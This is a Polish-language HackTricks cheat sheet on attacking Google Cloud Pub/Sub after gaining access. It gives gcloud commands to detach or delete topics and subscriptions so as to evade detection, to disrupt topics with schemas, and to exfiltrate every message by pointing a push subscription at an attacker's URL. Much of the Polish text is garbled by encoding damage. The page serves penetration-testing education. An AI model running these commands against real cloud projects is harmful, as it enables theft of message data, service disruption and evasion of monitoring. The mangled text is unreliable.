# GCP - Pub/Sub Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Pub/Sub

Aby uzyska wicej informacji na temat Pub/Sub, sprawd藕 nastpujc stron:

{% content-ref url="../gcp-services/gcp-pub-sub.md" %}
[gcp-pub-sub.md](../gcp-services/gcp-pub-sub.md)
{% endcontent-ref %}

### `pubsub.topics.publish`

Opublikuj wiadomo w temacie, przydatne do **wysyania nieoczekiwanych danych** i wywoywania nieoczekiwanych funkcji lub wykorzystywania luk:
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
### `pubsub.topics.detachSubscription`

Przydatne do zapobiegania odbieraniu wiadomoci przez subskrypcj, by mo偶e w celu uniknicia wykrycia.
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
### `pubsub.topics.delete`

Przydatne do zapobiegania subskrypcji w odbieraniu wiadomoci, by mo偶e w celu uniknicia wykrycia.\
Mo偶liwe jest usunicie tematu, nawet jeli s do niego przypisane subskrypcje.
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
### `pubsub.topics.update`

U偶yj tego uprawnienia, aby zaktualizowa niekt贸re ustawienia tematu, aby go zak贸ci, takie jak `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

Nadaj sobie uprawnienia do przeprowadzenia dowolnych z poprzednich atak贸w.

### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

Pobierz wszystkie wiadomoci na serwerze internetowym:

{% code overflow="wrap" %}
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
{% endcode %}

Utw贸rz subskrypcj i u偶yj jej do **pobierania wiadomoci**:
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
### `pubsub.subscriptions.delete`

**Usunicie subskrypcji** mo偶e by przydatne do zak贸cenia systemu przetwarzania log贸w lub czego podobnego:
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
### `pubsub.subscriptions.update`

U偶yj tego uprawnienia, aby zaktualizowa niekt贸re ustawienia, aby wiadomoci byy przechowywane w miejscu, do kt贸rego masz dostp (URL, tabela Big Query, Bucket) lub po prostu, aby to zak贸ci.

{% code overflow="wrap" %}
```bash
gcloud pubsub subscriptions update --push-endpoint <your URL> <subscription-name>
```
{% endcode %}

### `pubsub.subscriptions.setIamPolicy`

Nadaj sobie uprawnienia potrzebne do przeprowadzenia wczeniej om贸wionych atak贸w.

### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

Zaatakuj schemat do tematu, aby wiadomoci go nie speniay, a tym samym temat zosta zak贸cony.\
Jeli nie ma 偶adnych schemat贸w, by mo偶e bdziesz musia stworzy jeden.

{% code title="schema.json" %}
```json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```
{% endcode %}
```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
### `pubsub.schemas.delete`

To mo偶e wyglda jak usunicie schematu, dziki czemu bdziesz m贸g wysya wiadomoci, kt贸re nie speniaj wymaga schematu. Jednak偶e, poniewa偶 schemat zostanie usunity, 偶adna wiadomo tak naprawd nie wejdzie do tematu. Tak wic to jest **BEZU呕YTECZNE**:
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
### `pubsub.schemas.setIamPolicy`

Nadaj sobie uprawnienia potrzebne do przeprowadzenia dowolnych wczeniej skomentowanych atak贸w.

### `pubsub.snapshots.create`, `pubsub.snapshots.seek`

To stworzy migawk wszystkich niepotwierdzonych wiadomoci i przywr贸ci je do subskrypcji. Niezbyt przydatne dla atakujcego, ale oto to:
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
